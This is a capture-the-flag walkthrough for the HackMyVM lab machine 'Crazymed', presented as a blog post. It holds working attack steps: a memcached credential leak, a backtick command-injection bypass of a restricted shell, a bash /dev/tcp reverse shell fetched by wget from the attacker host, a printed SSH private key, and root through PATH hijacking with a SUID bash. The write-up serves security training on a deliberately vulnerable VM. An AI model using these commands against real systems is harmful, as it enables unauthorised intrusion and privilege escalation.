---
layout: post
title: "HackMyVM - Crazymed"
date: 2022-11-03 14:30:00 +0100
categories: hmv
tag: ["RCE", "PathHijack"]
---

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Easy
Release Date: 2022-11-02

## Scan

```
$ nmap -sC -sV -oA scans/Crazymed -p- 192.168.1.16                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 13:58 WET
Nmap scan report for 192.168.1.16
Host is up (0.0018s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 dbfbb1fe039c173683ac6bc052ada005 (RSA)
|   256 563b7ce3234a255abe54d12e9d449a06 (ECDSA)
|_  256 81d42e473334a96f1070c19080aab66a (ED25519)
80/tcp    open  http      Apache httpd 2.4.54 ((Debian))
|_http-title: Crazymed Bootstrap Template - Index
|_http-server-header: Apache/2.4.54 (Debian)
4444/tcp  open  krb524?
11211/tcp open  memcached Memcached 1.6.9 (uptime 76 seconds)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.24 seconds

```

## 11211 (memcache)

```
$ telnet 192.168.1.16 11211
Trying 192.168.1.16...
Connected to 192.168.1.16.
Escape character is '^]'.

stats cachedump 1 0
ITEM domain [8 b; 0 s]
ITEM server [9 b; 0 s]
ITEM log [18 b; 0 s]
ITEM conf_location [21 b; 0 s]
END

get log
VALUE log 0 18
password: cr4zyM3d
END

get domain
VALUE domain 0 8
crazymed
END

get server
VALUE server 0 9
127.0.0.1
END

get conf_location
VALUE conf_location 0 21
/etc/memecacched.conf
END
```

### 4444 (netcat)

```
Welcome to the Crazymed medical research laboratory.
All our tests are performed on human volunteers for a fee.


Password: cr4zyM3d
Access granted.

Type "?" for help.

System command:
```

## Bypass shell command line restrictions

```
System command: ?
Authorized commands: id who echo clear 

System command: id
uid=1000(brad) gid=1000(brad) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

System command: echo $(cat /etc/passwd)
Attack detected.

System command: echo `cat /etc/passwd`
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:109::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin avahi-autoipd:x:105:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin brad:x:1000:1000:brad,,,:/home/brad:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin memcache:x:107:115:Memcached,,,:/nonexistent:/bin/false
System command:
```

### Reverse Shell

```bash
$ vi shell.sh  

$ cat shell.sh         
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.6/443 0>&1

$ chmod +x shell.sh 
```

System command: echo `wget http://192.168.1.6:9000/shell.sh`

```
$ python -m http.server 9000                                                                    
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
192.168.1.16 - - [03/Nov/2022 14:46:37] "GET /shell.sh HTTP/1.1" 200 -
```

System command: echo `bash ./shell.sh`

```
$ sudo nc -lvnp 443    
listening on [any] 443 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.16] 44544
bash: cannot set terminal process group (380): Inappropriate ioctl for device
bash: no job control in this shell
brad@crazymed:~$ 
```
 
## SSH Foothold (brad)

```
brad@crazymed:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA7RxztsvAPFz3TvDfW7xfFrsltczhiDcNYMkMVsyWTlXBQTb7CiDs
...
[REDACTED]
...
J2fBgTP6cJbQYfAUnl5JgLCMl7+8amqGP/zuHUmkb4K14WNm07Btnkw3TFsmWAikhYWkR6
qiZoMJHqz+cr/MA/Rtz/Y370Lq5TOdr7pUIzF8zj8xCkaCMDs5f9L4Brs9xuflz67zA93J
KlxiCx/FiOytUAAAAKYnJhZEBkYW5nYQE=
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ chmod 600 id_rsa

$ ssh -i id_rsa brad@192.168.1.16
Linux crazymed 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
Last login: Mon Nov 03 18:36:58 2022 from 192.168.0.29
brad@crazymed:~$ 
```

## Linpeas

```
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                     
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                                                                               
New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
```

## PSPY32

```
2022/11/03 15:58:01 CMD: UID=0    PID=21695  | /bin/sh -c /opt/check_VM 
2022/11/03 15:58:01 CMD: UID=0    PID=21696  | /bin/bash /opt/check_VM 
2022/11/03 15:58:01 CMD: UID=0    PID=21697  | /bin/bash /opt/check_VM 
2022/11/03 15:58:01 CMD: UID=0    PID=21700  | /bin/bash /opt/check_VM 
2022/11/03 15:58:01 CMD: UID=0    PID=21699  | /bin/bash /opt/check_VM 
2022/11/03 15:58:01 CMD: UID=0    PID=21698  | /bin/bash /opt/check_VM
```

```
brad@crazymed:/tmp$ cat /opt/check_VM 
```

```bash
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
brad@crazymed:/tmp$
```

## ROOT - Path Hijack

```
brad@crazymed:/tmp$ echo "chmod u+s /bin/bash" > /usr/local/bin/chown
brad@crazymed:/tmp$ chmod +x /usr/local/bin/chown

brad@crazymed:/tmp$ /bin/bash -p
bash-5.1# id
uid=1000(brad) gid=1000(brad) euid=0(root) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```
